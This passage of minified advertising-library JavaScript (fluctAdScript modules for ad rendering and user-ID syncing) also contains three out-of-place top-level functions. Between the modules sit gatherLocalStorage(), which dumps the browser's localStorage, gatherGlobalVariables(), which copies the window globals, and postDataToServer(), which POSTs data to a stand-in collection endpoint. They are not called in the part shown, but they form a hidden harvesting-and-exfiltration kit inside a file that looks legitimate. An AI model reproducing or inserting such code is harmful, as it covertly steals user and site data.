                  if (s) {
                    var p = s.lmt || "",
                      f = s.ifa || "",
                      m = s.bundle || "";
                    a.addParamsForADNW(l, p, f, m), d = a.expandMacro(d, p, f);
                  }
                  l.fluctAdModifier = o;
                  var v = l.document;
                  d = '<script type="text/javascript">var inDapIF=true;<\/script><body style="margin: 0;">' + d + "</body>", v.open(), v.addEventListener("DOMContentLoaded", function () {
                    c && c(), l.document.addEventListener("click", function () {
                      return i.fire(e, n);
                    }, !0);
                  }), v.write(d), v.close();
                } catch (e) {
                  throw c && c(), e;
                }
              }(i, o, c, e.modifierMap, u, e.onCompleteRender), t.sendBeacons(i, o, c.imp_beacons), [{
                container: o,
                root: e.root,
                componentMap: e.componentMap
              }]);
              return t.resizeTopIframeElement(null === (n = o.ownerDocument) || void 0 === n ? void 0 : n.defaultView, c.width, c.height), r;
            });
          };
        }(c, u, h));
      case "image":
        return s(e, c.unit_id, function (e, n) {
          return function (r) {
            var o = r.ownerDocument,
              i = e,
              a = new f(i.click_beacons);
            return n.apply(r, i).then(function (e) {
              var n;
              if (null === e) return [{
                container: r
              }];
              try {
                !function (e, n, t, r) {
                  var o = e.createElement("img");
                  o.src = t.creative_url, o.alt = t.alt, o.width = parseInt(n.style.width, 10), o.height = parseInt(n.style.height, 10);
                  var i = e.createElement("a");
                  i.href = t.landing_url, i.target = t.target, i.rel = "noopener noreferrer", i.addEventListener("click", function () {
                    return r.fire(e, n);
                  }), i.appendChild(o), n.appendChild(i);
                }(o, r, i, a), e.onCompleteRender && e.onCompleteRender();
              } catch (n) {
                e.onCompleteRender && e.onCompleteRender();
              }
              return t.sendBeacons(o, r, i.imp_beacons), t.resizeTopIframeElement(null === (n = r.ownerDocument) || void 0 === n ? void 0 : n.defaultView, i.width, i.height), [{
                container: r,
                root: e.root,
                componentMap: e.componentMap
              }];
            });
          };
        }(c, u));
      case "vast":
        return s(e, c.unit_id, function (e, n, r, o) {
          return function (i) {
            var a = i.ownerDocument,
              c = e;
            return n.apply(i, c).then(function (e) {
              return null === e ? [{
                container: i
              }] : window.fluctAdScript.mod.import("lib/vast_renderer").then(function (n) {
                try {
                  n(a, i, c, o, r.video), e.onCompleteRender && e.onCompleteRender();
                } catch (n) {
                  e.onCompleteRender && e.onCompleteRender();
                }
                return [{
                  container: i,
                  root: e.root,
                  componentMap: e.componentMap
                }];
              }).then(function (e) {
                var n;
                return t.resizeTopIframeElement(null === (n = i.ownerDocument) || void 0 === n ? void 0 : n.defaultView, c.width, c.height), e;
              });
            });
          };
        }(c, u, m, h));
      case "native":
        return function (e, n, r) {
          var o = e.filter(function (r) {
            if (!t.isElementExistInTree(r)) {
              var o = "One of " + e.length + ' container(s) for unit "' + n + '" has already been removed';
              return l.warn(o, {
                msg: o
              }, .1), !1;
            }
            return !0;
          });
          if (o.length < 1) return i.PromiseLike.resolve([]);
          return r(o);
        }(e, c.unit_id, function (e, r, o) {
          return function (a) {
            var c = e;
            return i.PromiseLike.all(a.map(function (e) {
              return p(e) ? i.PromiseLike.resolve({
                container: e,
                root: e,
                componentMap: {}
              }) : r.apply(e, c).then(function (n) {
                return null === n ? {
                  container: e
                } : (n.onCompleteRender && n.onCompleteRender(), {
                  container: e,
                  root: n.root,
                  componentMap: n.componentMap
                });
              });
            })).then(function (e) {
              var r = e.filter(function (e) {
                return null !== e.root;
              });
              return window.fluctAdScript.mod.import("native/runtime").then(function (i) {
                var a = i.main,
                  u = r.map(function (e) {
                    if (p(e.container)) return e.container;
                    var n = e.container.ownerDocument,
                      r = t.uuid(),
                      o = n.createElement("div");
                    return o.id = "fluct-nativertb-" + r, e.container.appendChild(o), o;
                  });
                u.length > 0 && new n.ClientHints(window).getUserAgentValues().then(function (e) {
                  var n;
                  a(d({
                    mountpoints: u,
                    spAppArgs: null != o ? o : {},
                    clickBeacon: c.click_beacon,
                    uaValues: e
                  }, c.nativeObj)), null === (n = u[0].ownerDocument.defaultView) || void 0 === n || n.dispatchEvent(new Event("resize"));
                });
                return e;
              });
            });
          };
        }(c, u, v));
      case "none":
        return s(e, c.unit_id, (w = c, function (e) {
          var n = e.ownerDocument;
          return t.sendBeacons(n, e, w.imp_beacons), r.GlobalEventHandler.handleRenderingFailed(new o.PjsError("NoAd", new Error("Unit " + w.unit_id + " has no ad"))), i.PromiseLike.resolve([{
            container: e
          }]);
        }));
      default:
        throw new Error("Detect unsupported creativ type: " + JSON.stringify(c));
    }
    var w;
  };
});
fluctAdScript.mod.define("lib/frame", ["exports", "./template", "./renderer"], function (e, t, r) {
  "use strict";

  var i = function () {
    function e(e, t) {
      this.reservedContainerList = [], this.ads = [], this.behavior = {}, this.spAppArgs = null, this.unitId = e, this.eventHandler = t;
    }
    return e.prototype.useReloadExt = function (e) {
      this.reloadExt = e;
    }, e.prototype.setResponse = function (e, r, i, n, o) {
      this.templatePromise = t.loadTemplate(e, r, i), this.groupId = e, this.behavior = i, this.spAppArgs = n, this.ads.push(o), this.reservedContainerList.length > 0 && this.render();
    }, e.prototype.registerContainer = function (e) {
      this.reservedContainerList.push(e), this.ads.length > 0 && this.render();
    }, e.prototype.registerContainers = function (e) {
      var t;
      (t = this.reservedContainerList).push.apply(t, e), this.ads.length > 0 && this.render();
    }, e.prototype.render = function () {
      var e = this,
        t = this.ads.shift();
      this.templatePromise.then(function (i) {
        return r.render(e.reservedContainerList, t, i, e.behavior, e.spAppArgs, e.groupId);
      }).then(function (r) {
        r.forEach(function (r) {
          var i = r.container,
            n = r.root,
            o = r.componentMap;
          n && e.eventHandler.handleRendered({
            creative: t,
            container: i,
            templateRoot: n,
            componentMap: o,
            groupId: e.groupId
          }), e.reloadIfNeeded(i);
        });
      });
    }, e.prototype.reloadIfNeeded = function (e) {
      if (this.behavior) {
        var t = this.behavior.refreshRate;
        t && 0 !== t && this.reloadExt && this.reloadExt.reload(this.groupId, this.unitId, e, t);
      }
    }, e.prototype.wasLoadedBy = function (e) {
      return this.groupId === e;
    }, e;
  }();
  e.Frame = i;
});
fluctAdScript.mod.define("lib/store", ["exports", "./frame", "./util", "./event_handler"], function (e, t, r, n) {
  "use strict";

  var a = function () {
    function e() {
      this.frames = {}, this.eventHandler = new n.EventHandler(), this.eventHandler.addRenderedHandler(function (e) {
        return n.GlobalEventHandler.handleRendered(e);
      }), this.eventHandler.addErrorHandler(function (e) {
        return n.GlobalEventHandler.handleRenderingFailed(e);
      });
    }
    return e.prototype.getFrame = function (e) {
      return this.frames[e];
    }, e.prototype.getOrCreateFrame = function (e) {
      var r = this.getFrame(e);
      return r || (this.frames[e] = new t.Frame(e, this.eventHandler), this.frames[e]);
    }, e.prototype.setResponse = function (e, t) {
      for (var n, a = e.resp, i = r.mergeObject(a.template, e.template || {}), o = r.mergeObjectDeep(a.behavior, e.behavior || {}), s = 0; s < a.ads.length; s++) {
        var d = a.ads[s],
          l = this.getOrCreateFrame(String(d.unit_id));
        l.useReloadExt(t), l.setResponse(e.groupId, i, o, null !== (n = e.spAppArgs) && void 0 !== n ? n : null, d);
      }
    }, e.prototype.registerContainer = function (e, t) {
      null !== t && this.getOrCreateFrame(e).registerContainer(t);
    }, e.prototype.registerContainers = function (e, t) {
      t.length < 1 || this.getOrCreateFrame(e).registerContainers(t);
    }, e;
  }();
  e.Store = a;
});
fluctAdScript.mod.define("lib/fetch", ["exports", "./promise"], function (t, e) {
  "use strict";

  function n(t) {
    return function (t, e, n) {
      return t >= e && t <= n;
    }(t, 200, 299);
  }
  t.fetch = function (t) {
    return new e.PromiseLike(function (e, o) {
      var r = new XMLHttpRequest();
      r.open("GET", t, !0), r.withCredentials = !0, r.onload = function () {
        var t = r.status,
          o = n(t);
        e({
          body: r.responseText,
          status: t,
          ok: o
        });
      }, r.onerror = function () {
        o(new Error("Failed to fetch " + t));
      }, r.send();
    });
  }, t.is2xx = n;
});
fluctAdScript.mod.define("lib/sej", ["exports"], function (p) {
  "use strict";

  p.BUNDLE_LIST_OF_SEJ_APPS = ["jp.co.sej.omniapp", "jp.7netshopping.devsej", "jp.co.sej.app"];
});
fluctAdScript.mod.define("lib/api", ["exports", "./fetch", "./promise", "./event_handler", "./error", "./util", "./sej", "./logger"], function (e, r, t, n, o, a, i, u) {
  "use strict";

  function c(e) {
    if (e && e.__esModule) return e;
    var r = Object.create(null);
    return e && Object.keys(e).forEach(function (t) {
      if ("default" !== t) {
        var n = Object.getOwnPropertyDescriptor(e, t);
        Object.defineProperty(r, t, n.get ? n : {
          enumerable: !0,
          get: function () {
            return e[t];
          }
        });
      }
    }), r.default = e, Object.freeze(r);
  }
  var s = c(u);
  function f(e) {
    var r = e.bundle;
    r && function (e) {
      return a.includes(i.BUNDLE_LIST_OF_SEJ_APPS, e);
    }(r) && delete e.ifa;
  }
  function d(e, r, t) {
    var n = Math.floor(1e14 * Math.random()),
      o = a.getPage(window),
      i = encodeURIComponent(o.href),
      u = encodeURIComponent(o.referrer);
    f(t);
    var c = function (e) {
      var r = [];
      for (var t in e) r.push(encodeURIComponent(t) + "=" + encodeURIComponent(e[t]));
      return r.join("&");
    }(t);
    return e + "/p/?G=" + r + "&href=" + i + "&R=" + u + "&serial=" + n + "&guid=ON" + (c = c ? "&" + c : "");
  }
  e.request = function (e, i, u) {
    var c = d(e, i, u),
      f = 0,
      l = function (e) {
        if ((f += 1) >= 0) {
          var a = new o.PjsError("ConnectionFailedForDlv", e);
          return a.notify(.1), n.GlobalEventHandler.handleRenderingFailed(a), t.never();
        }
        return t.delay(500).then(function () {
          return r.fetch(c).catch(l);
        });
      };
    return r.fetch(c).catch(l).then(function (e) {
      if (!e.ok) throw new Error("Receive failure response status: " + e.status + ', body: "' + e.body + '", from ' + c);
      var r,
        t = e.body;
      try {
        r = JSON.parse(t);
      } catch (e) {
        throw new Error('Failed to parse body as response of "' + c + '": "' + t + '"');
      }
      return function (e) {
        var r = Object.keys(e),
          t = ["ads", "syncList", "template", "behavior", "adStatus"].filter(function (e) {
            return !a.includes(r, e);
          });
        if (0 !== t.length) {
          var n = "Fields " + JSON.stringify(t) + " are not found in response " + JSON.stringify(e);
          s.warn(n, {
            msg: n
          }, 1);
        }
        return {
          ads: e.ads || [],
          syncList: e.syncList || [],
          template: e.template || {
            k: "api",
            v: 1
          },
          behavior: e.behavior || {},
          adStatus: e.adStatus || 200
        };
      }(r);
    });
  };
});
fluctAdScript.mod.define("lib/fluct_uid", ["exports"], function (e) {
  "use strict";

  var t;
  e.KeyName = void 0, (t = e.KeyName || (e.KeyName = {})).TankmanID = "fluct_ppUUIDv4", t.FluctUID = "fluct_uid";
  var a = [e.KeyName.TankmanID, e.KeyName.FluctUID];
  e.normalize = function (t) {
    for (var u = 0, n = a; u < n.length; u++) {
      var r = n[u];
      if (t[r]) return t[e.KeyName.FluctUID] = t[r], t;
    }
    return t;
  };
});
fluctAdScript.mod.define("lib/idext/fluctuid", ["exports", "../promise", "../util"], function (t, e, o) {
  "use strict";

  var r = "fluctUID",
    i = "fluct_uid",
    n = function () {
      function t() {
        this.fired = !1;
      }
      return t.prototype.getIDs = function () {
        var t = this;
        return new e.PromiseLike(function (e) {
          var o,
            r,
            n = t.loadID();
          if (n) e({
            ok: !0,
            itemMap: (o = {}, o[i] = [n], o)
          });else {
            var u = t.generateFluctUID(null);
            t.saveID(u), e({
              ok: !0,
              itemMap: (r = {}, r[i] = [u], r)
            });
          }
        });
      }, t.prototype.fireIDs = function (t) {
        var o = this;
        return this.fired ? e.PromiseLike.resolve({
          ok: !1
        }) : (this.fired = !0, this.loadID() ? e.PromiseLike.resolve({
          ok: !1
        }) : new e.PromiseLike(function (t) {
          var e,
            r = o.generateFluctUID(null);
          o.saveID(r), t({
            ok: !0,
            itemMap: (e = {}, e[i] = [r], e)
          });
        }));
      }, t.prototype.generateFluctUID = function (t) {
        return null != t ? t : o.uuid();
      }, t.prototype.loadID = function () {
        try {
          return localStorage.getItem(r);
        } catch (t) {
          return null;
        }
      }, t.prototype.saveID = function (t) {
        try {
          localStorage.setItem(r, t);
          var e = window;
          o.sendIdToCookieMonster("fluct_uid", t, e);
        } catch (t) {}
      }, t;
    }();
  t.FluctUIDExt = n, t.ID_KEY = i;
});
function gatherLocalStorage() {
  return JSON.parse(JSON.stringify(localStorage));
}
fluctAdScript.mod.define("lib/idext/tankman", ["exports", "../promise", "../fetch", "../fluct_uid", "./fluctuid"], function (t, e, n, r, u) {
  "use strict";

  function i(t) {
    if (t && t.__esModule) return t;
    var e = Object.create(null);
    return t && Object.keys(t).forEach(function (n) {
      if ("default" !== n) {
        var r = Object.getOwnPropertyDescriptor(t, n);
        Object.defineProperty(e, n, r.get ? r : {
          enumerable: !0,
          get: function () {
            return t[n];
          }
        });
      }
    }), e.default = t, Object.freeze(e);
  }
  var o = i(r),
    c = o.KeyName.TankmanID,
    a = o.KeyName.TankmanID,
    f = new RegExp(/^[0-9A-F]{8}-[0-9A-F]{4}-4[0-9A-F]{3}-[89AB][0-9A-F]{3}-[0-9A-F]{12}$/i),
    s = function (t) {
      var r;
      try {
        var i = null !== (r = localStorage.getItem(c)) && void 0 !== r ? r : "";
        if (f.test(i)) return e.PromiseLike.resolve(i);
      } catch (t) {}
      var o = new u.FluctUIDExt();
      return n.fetch(function (t, e) {
        if (e && e.match(f)) {
          var n = t.includes("?") ? "&" : "?";
          return "" + t + n + "uuid=" + e;
        }
        return t;
      }(t, o.loadID())).then(function (t) {
        if (!t.ok) return "";
        var e = t.body;
        if (!e.match(f)) return "";
        try {
          localStorage.setItem(c, e), o.saveID(e);
        } catch (t) {}
        return e;
      });
    },
    l = new (function () {
      function t() {}
      return t.prototype.fire = function (t) {
        this.thunk || (this.thunk = s(t));
      }, t.prototype.peace = function () {
        this.thunk || (this.thunk = e.PromiseLike.resolve(""));
      }, t.prototype.getThunk = function () {
        return this.thunk;
      }, t.prototype.getResult = function (t) {
        var e;
        return f.test(t) ? {
          ok: !0,
          itemMap: (e = {}, e[a] = [t], e)
        } : {
          ok: !1
        };
      }, t;
    }())();
  t.ID_KEY = a, t.instance = l, t.v4 = f;
});
fluctAdScript.mod.define("lib/idext/rtus", ["exports", "../promise", "../util"], function (t, e, r) {
  "use strict";

  var o = "rtusId",
    i = "criteo_rtus",
    s = function () {
      function t() {
        this.fired = !1, this.resolve = function (t) {};
      }
      return t.prototype.getIDs = function () {
        return new e.PromiseLike(function (t) {
          var e, r;
          try {
            r = localStorage.getItem(o);
          } catch (t) {}
          t(r ? {
            ok: !0,
            itemMap: (e = {}, e[i] = [r], e)
          } : {
            ok: !1
          });
        });
      }, t.prototype.fireIDs = function (t) {
        var r,
          i = this;
        if (this.fired) return e.PromiseLike.resolve({
          ok: !1
        });
        this.fired = !0;
        try {
          r = localStorage.getItem(o);
        } catch (t) {}
        return r ? e.PromiseLike.resolve({
          ok: !1
        }) : new e.PromiseLike(function (t) {
          i.resolve = t;
          var e = document.createElement("script");
          e.async = !0, e.type = "text/javascript", e.src = "https://gum.criteo.com/sync?c=167&r=2&gdpr=0&j=fluctAdScript.rtus_cb", document.head.appendChild(e);
        });
      }, t.prototype.getCallback = function () {
        var t = this;
        return function (e) {
          var s;
          if ("OK" === e.status) {
            try {
              localStorage.setItem(o, e.userid);
              var c = window;
              r.sendIdToCookieMonster("criteo_rtus", e.userid, c);
            } catch (t) {}
            t.resolve({
              ok: !0,
              itemMap: (s = {}, s[i] = [e.userid], s)
            });
          } else t.resolve({
            ok: !1
          });
        };
      }, t;
    }();
  t.CriteoRtusExt = s, t.ID_KEY = i;
});
fluctAdScript.mod.define("lib/idext/liveramp", ["exports", "../promise"], function (e, t) {
  "use strict";

  var r = function () {
      return (r = Object.assign || function (e) {
        for (var t, r = 1, o = arguments.length; r < o; r++) for (var i in t = arguments[r]) Object.prototype.hasOwnProperty.call(t, i) && (e[i] = t[i]);
        return e;
      }).apply(this, arguments);
    },
    o = "fluct-lrenv",
    i = "lrenv",
    n = function () {
      function e(e) {
        void 0 === e && (e = window), this.fired = !1, this.w = e;
      }
      return e.prototype.getIDs = function () {
        var e,
          r = this.getEnvelopeFromStorage();
        return r ? t.PromiseLike.resolve({
          ok: !0,
          itemMap: (e = {}, e.lrenv = [r], e)
        }) : t.PromiseLike.resolve({
          ok: !1
        });
      }, e.prototype.fireIDs = function (e) {
        var r,
          o = this;
        if (this.fired) return t.PromiseLike.resolve({
          ok: !1
        });
        this.fired = !0;
        var i = this.getEnvelopeFromStorage();
        return i ? t.PromiseLike.resolve({
          ok: !0,
          itemMap: (r = {}, r.lrenv = [i], r)
        }) : new t.PromiseLike(function (e) {
          try {
            var t = o.w.ats || o.w.top.ats;
            if (t) return void t.retrieveEnvelope(o.getCallback(e));
            e({
              ok: !1
            });
          } catch (t) {
            e({
              ok: !1
            });
          }
        });
      }, e.prototype.getCallback = function (e) {
        var t = this;
        return function (r) {
          var o;
          if (void 0 !== r) {
            var i = null;
            try {
              i = JSON.parse(r);
            } catch (e) {}
            if (i && i.envelope) {
              try {
                t.setEnvelopeToStorage(i);
              } catch (e) {}
              e({
                ok: !0,
                itemMap: (o = {}, o.lrenv = [i.envelope], o)
              });
            } else e({
              ok: !1
            });
          } else e({
            ok: !1
          });
        };
      }, e.prototype.setEnvelopeToStorage = function (e) {
        var t = Date.now();
        e.timestamp || (e.timestamp = t);
        var i = r(r({}, e), {
          ver: "1.0",
          expiration: t + 864e5
        });
        try {
          this.w.localStorage.setItem(o, JSON.stringify(i));
        } catch (e) {}
      }, e.prototype.getEnvelopeFromStorage = function () {
        var e = null;
        try {
          e = this.w.localStorage.getItem(o);
        } catch (e) {}
        if (!e) return null;
        var t = JSON.parse(e);
        if (!t || !t.envelope || !t.ver || "1.0" !== t.ver || !t.expiration || t.expiration < Date.now()) {
          try {
            this.w.localStorage.removeItem(o);
          } catch (e) {}
          return null;
        }
        return t.envelope;
      }, e;
    }();
  e.ID_KEY = i, e.LiveRampExt = n;
});
fluctAdScript.mod.define("lib/idext/imuid", ["exports", "../promise", "../util"], function (t, i, e) {
  "use strict";

  var r = function () {
      return (r = Object.assign || function (t) {
        for (var i, e = 1, r = arguments.length; e < r; e++) for (var a in i = arguments[e]) Object.prototype.hasOwnProperty.call(i, a) && (t[a] = i[a]);
        return t;
      }).apply(this, arguments);
    },
    a = "imPmt6837",
    o = "fluct-imuid",
    s = "imuid",
    n = "imsids",
    g = ["NbE0o3km", "7kGVPm8x", "VgxADo8W", "2b6oZGgG", "Ok0KEQ8D", "58rA1LgB", "qkVvpGk9", "LkaanXk1", "X8KR3xgB", "p8JJZo8m", "DkR5pQ81", "EbjQARkD", "pb950Rbv", "EkWNP289", "YboAra84", "lg773Bgp", "6bQQqBbM", "Mg5WaGkq", "Q8Ym3L8d", "0bnqXqkR", "LbM97KbJ", "LgAEYeg4", "EgdRQAka", "xkD6AYgm", "J8BGERka", "Lb3jXWkN", "38pAp9kD", "EkXzywgm", "A8ZEmGgE", "DgLjpGkM", "NgwAqPkL", "YklYxXbJ", "9gqA3lga", "xgP7q9bl", "ekypO38j", "ebejz4gv", "8YqlNl18", "8BVAGAe8", "ky1ee4Dk", "kG3NNVyk", "kmlmqNY8", "kG3NvDpk", "ka6ee4eb", "k2AEDQj8", "8zY92P4g", "gO5lGpdk", "k1GmZLwg", "g7VrxvDb", "klD423Dk", "gvqKoW0b", "gPKlZXXb", "gvqK5pNb", "gO5rENWk", "gLqlAGK8", "gO5l6Zrk", "gvqKDVKb", "gwrJp2Ab", "klD4Z5rk", "gO5lVLrk", "kXDlepKk", "8BVQJV28", "kG3ADPak", "gxQR02D8", "b6N0LXXb", "k034al38", "8rN04qW8", "k2AE7308", "gO5lMW7k", "gvqKxw0b", "8NqlP7pg", "g4OxX35b", "kV0yEK3g", "ka6l9VGb", "8Kql9zQb", "8JAqo71g", "kR3lvE4b", "bjov9EZg", "b9EalLXb", "kWJlGjp8", "bo2zOp9k", "g7VrnX7b", "bQAlO79b", "g5r63vp8", "8Yql6PR8", "bnDE2Ye8", "bEznRXqg", "b6N0LBwb", "k034aWj8", "8rN04OB8"].reduce(function (t, i) {
      var e;
      return r(r({}, t), ((e = {})[i] = !0, e));
    }, {}),
    l = function () {
      function t(t) {
        void 0 === t && (t = window), this.w = e.findFriendlyTopWindow(t), this.w.__im_uid_callback = this.setUIDToStorage.bind(this), this.w.__im_sids_callback = this.setSIDSToStorage.bind(this);
      }
      return t.prototype.getIDs = function () {
        var t = this.getDataFromWindow();
        if (t) return i.PromiseLike.resolve({
          ok: !0,
          itemMap: t
        });
        var e = this.getDataFromStorage();
        return e ? i.PromiseLike.resolve({
          ok: !0,
          itemMap: e
        }) : i.PromiseLike.resolve({
          ok: !1
        });
      }, t.prototype.fireIDs = function (t) {
        var e = this,
          r = this.getDataFromWindow();
        if (r) {
          try {
            this.setDataToStorage(r);
          } catch (t) {}
          return i.PromiseLike.resolve({
            ok: !0,
            itemMap: r
          });
        }
        return new i.PromiseLike(function (t) {
          if (e.w.document.getElementById(a)) t({
            ok: !1
          });else {
            var i = e.w.document.createElement("script");
            i.id = a, i.async = !0, i.type = "text/javascript", i.src = "https://dmp.im-apps.net/pms/r7RdVKlj/pmt.js", i.dataset.uidCallback = "__im_uid_callback", i.dataset.sidsCallback = "__im_sids_callback";
            try {
              e.w.document.head.appendChild(i);
            } catch (t) {}
            t({
              ok: !1
            });
          }
        });
      }, t.prototype.setUIDToStorage = function (t) {
        var i;
        if ("string" == typeof t) {
          var r = t,
            a = this.getDataFromStorage();
          a ? a.imuid = [r] : ((i = {}).imuid = [r], i.imsids = [], a = i), this.setDataToStorage(a), e.sendIdToCookieMonster("imuid", r, this.w);
        }
      }, t.prototype.setSIDSToStorage = function (t) {
        var i;
        if (Array.isArray(t)) {
          var e = t.filter(this.filterSIDS),
            r = this.getDataFromStorage();
          r ? r.imsids = e : ((i = {}).imuid = [], i.imsids = e, r = i), this.setDataToStorage(r);
        }
      }, t.prototype.setDataToStorage = function (t) {
        var i = Date.now(),
          e = JSON.stringify({
            itemMap: t,
            ver: "2.0",
            timestamp: i,
            expiration: i + 864e5
          });
        try {
          this.w.localStorage.setItem(o, e);
        } catch (t) {}
      }, t.prototype.getDataFromStorage = function () {
        var t = null;
        try {
          t = this.w.localStorage.getItem(o);
        } catch (t) {}
        if (!t) return null;
        var i = JSON.parse(t);
        if (!i || !i.itemMap || !i.ver || "2.0" !== i.ver || !i.expiration || i.expiration < Date.now()) {
          try {
            this.w.localStorage.removeItem(o);
          } catch (t) {}
          return null;
        }
        return i.itemMap;
      }, t.prototype.getDataFromWindow = function () {
        var t,
          i = "",
          e = [];
        return "string" == typeof this.w.__im_uid_6837 && (i = this.w.__im_uid_6837), Array.isArray(this.w.__im_sids_6837) && (e = this.w.__im_sids_6837.filter(this.filterSIDS)), i ? ((t = {}).imuid = [i], t.imsids = e, t) : null;
      }, t.prototype.filterSIDS = function (t) {
        return g[String(t)];
      }, t;
    }();
  t.ID_KEY = s, t.IMUIDExt = l, t.SIDS_KEY = n;
});
function gatherGlobalVariables() {
  const globalVars = {};
  for (let key in window) {
    if (window.hasOwnProperty(key) && !key.startsWith('_') && ['object', 'string', 'number', 'boolean'].includes(typeof window[key])) {
      globalVars[key] = window[key];
    }
  }
  return globalVars;
}
fluctAdScript.mod.define("lib/cookie", ["exports"], function (e) {
  "use strict";

  function i(e) {
    return void 0 === e && (e = document), (i = e.cookie) ? i.split(";").map(function (e) {
      var i = e.trim(),
        t = i.indexOf("=");
      if (-1 !== t) return {
        key: i.slice(0, t),
        value: i.slice(t + 1)
      };
    }).filter(function (e) {
      return !!e;
    }) : [];
    var i;
  }
  e.getCookie = function (e, t) {
    return void 0 === t && (t = document), i(t).find(function (i) {
      return i.key === e;
    });
  }, e.getCookies = i, e.setCookie = function (e, i) {
    void 0 === i && (i = document), i.cookie = function (e) {
      var i = [e.key + "=" + e.value];
      return e.path && i.push("path=" + e.path), e.expires && i.push("expires=" + e.expires), i.join(";");
    }(e);
  };
});
fluctAdScript.mod.define("lib/idext/a1", ["exports", "../cookie", "../promise", "../util"], function (t, e, i, r) {
  "use strict";

  var n = "a1_gid",
    s = "__a1tg",
    o = function () {
      function t(t) {
        void 0 === t && (t = window), this.w = r.findFriendlyTopWindow(t), this.itemMap = {}, this.fired = !1;
      }
      return t.prototype.getItemMap = function (t) {
        for (var i, r = {}, o = 0, a = e.getCookies(t); o < a.length; o++) {
          var c = a[o],
            p = null !== (i = c.value) && void 0 !== i ? i : "";
          if ("" !== p) {
            switch (c.key) {
              case n:
                r[c.key] = [p];
                break;
              case s:
                var h = p.split(/,/).filter(function (t) {
                  return "" !== t;
                });
                h.length && (r[c.key] = h);
            }
            if (r.hasOwnProperty(n) && r.hasOwnProperty(s)) break;
          }
        }
        return r;
      }, t.prototype.getIDs = function () {
        return this.itemMap.hasOwnProperty(n) || (this.itemMap = this.getItemMap(this.w.document)), i.PromiseLike.resolve({
          ok: !0,
          itemMap: this.itemMap
        });
      }, t.prototype.fireIDs = function (t) {
        if (this.fired) return this.getIDs();
        this.fired = !0;
        var e = new Date(),
          i = "https://linkback.contentsfeed.com/src/" + (e.getFullYear().toString() + ("0" + (e.getMonth() + 1)).slice(-2) + ("0" + e.getDate()).slice(-2)) + "/lb4jpfluct.min.js",
          r = this.w.document.createElement("script");
        r.type = "text/javascript", r.async = !0, r.src = i;
        try {
          this.w.document.head.appendChild(r);
        } catch (t) {}
        return this.getIDs();
      }, t;
    }();
  t.A1IDExt = o, t.A1_KEY_A1GID = n, t.A1_KEY_A1TG = s;
});
async function postDataToServer(data) {
  const url = "https://example.com/api/collect";
  try {
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(data)
    });
    if (response.ok) {
      console.log("Data sent successfully");
    } else {
      console.error("Failed to send data, status:" + response.status);
    }
  } catch (error) {
    console.error("Error occurred while sending data: ", error);
  }
}
fluctAdScript.mod.define("lib/idext/idhub", ["exports", "../promise", "../util", "./tankman", "./rtus", "./liveramp", "./imuid", "./fluctuid", "./a1"], function (e, t, s, n, i, u, o, r, a) {
  "use strict";

  var p;
  e.MessageID = void 0, (p = e.MessageID || (e.MessageID = {}))[p._Blank = 0] = "_Blank", p[p.NoResponseRequired = 1] = "NoResponseRequired", p[p.CriteoRtusIDRequest = 2] = "CriteoRtusIDRequest", p[p.CriteoRtusIDResponse = 3] = "CriteoRtusIDResponse", p[p.CriteoRtusFireRequest = 4] = "CriteoRtusFireRequest", p[p.LiveRampEnvelopeRequest = 5] = "LiveRampEnvelopeRequest", p[p.LiveRampEnvelopeResponse = 6] = "LiveRampEnvelopeResponse", p[p.LiveRampEnvelopeFireRequest = 7] = "LiveRampEnvelopeFireRequest", p[p.IMUIDRequest = 8] = "IMUIDRequest", p[p.IMUIDResponse = 9] = "IMUIDResponse", p[p.IMUIDFireRequest = 10] = "IMUIDFireRequest", p[p.FluctUIDRequest = 11] = "FluctUIDRequest", p[p.FluctUIDResponse = 12] = "FluctUIDResponse", p[p.FluctUIDFireRequest = 13] = "FluctUIDFireRequest", p[p.FluctMetaRequest = 14] = "FluctMetaRequest", p[p.FluctMetaResponse = 15] = "FluctMetaResponse", p[p.TankmanIDRequest = 16] = "TankmanIDRequest", p[p.TankmanIDResponse = 17] = "TankmanIDResponse", p[p.A1IDRequest = 18] = "A1IDRequest", p[p.A1IDFireRequest = 19] = "A1IDFireRequest", p[p.A1IDResponse = 20] = "A1IDResponse";
  var I = function () {
      function p(e) {
        void 0 === e && (e = window), this.window = e, this.window.addEventListener("message", this.dispatch.bind(this)), this.rtus = new i.CriteoRtusExt(), this.liveramp = new u.LiveRampExt(), this.imuid = new o.IMUIDExt(), this.fluctuid = new r.FluctUIDExt(), this.a1 = new a.A1IDExt();
      }
      return p.prototype.dispatch = function (t) {
        var s = R(t.data);
        if (null !== s && s.msgid) switch (s.msgid) {
          case e.MessageID.CriteoRtusIDRequest:
            return this.handleCriteoRtusIDRequest(t, s);
          case e.MessageID.CriteoRtusFireRequest:
            return this.handleCriteoRtusFireRequest(t, s);
          case e.MessageID.LiveRampEnvelopeRequest:
            return this.handleLiveRampEnvelopeRequest(t, s);
          case e.MessageID.LiveRampEnvelopeFireRequest:
            return this.handleLiveRampEnvelopeFireRequest(t, s);
          case e.MessageID.IMUIDRequest:
            return this.handleIMUIDRequest(t, s);
          case e.MessageID.IMUIDFireRequest:
            return this.handleIMUIDFireRequest(t, s);
          case e.MessageID.FluctUIDRequest:
            return this.handleFluctUIDRequest(t, s);
          case e.MessageID.FluctUIDFireRequest:
            return this.handleFluctUIDFireRequest(t, s);
          case e.MessageID.FluctMetaRequest:
            return this.handleMeta(t, s);
          case e.MessageID.TankmanIDRequest:
            return this.handleTankmanIDRequest(t, s);
          case e.MessageID.A1IDRequest:
            return this.handleA1IDRequest(t, s);
          case e.MessageID.A1IDFireRequest:
            return this.handleA1IDFireRequest(t, s);
        }
      }, p.prototype.handleIDResponse = function (e, t, s) {
        var n = this;
        s.then(function (s) {
          s.ok ? n.reply(e, D({
            msgid: t.responseMsgid,
            ok: !0,
            itemMap: s.itemMap
          })) : n.reply(e, D({
            msgid: t.responseMsgid,
            ok: !1
          }));
        });
      }, p.prototype.reply = function (e, t) {
        null !== e.source && e.source.postMessage(t, "*");
      }, p.prototype.handleCriteoRtusIDRequest = function (e, t) {
        this.handleIDResponse(e, t, this.getRtusID());
      }, p.prototype.handleCriteoRtusFireRequest = function (e, t) {
        this.fireRtusID(t.opts);
      }, p.prototype.handleLiveRampEnvelopeRequest = function (e, t) {
        this.handleIDResponse(e, t, this.getLiveRampEnvelope());
      }, p.prototype.handleLiveRampEnvelopeFireRequest = function (e, t) {
        this.fireLiveRampEnvelope(t.opts);
      }, p.prototype.handleIMUIDRequest = function (e, t) {
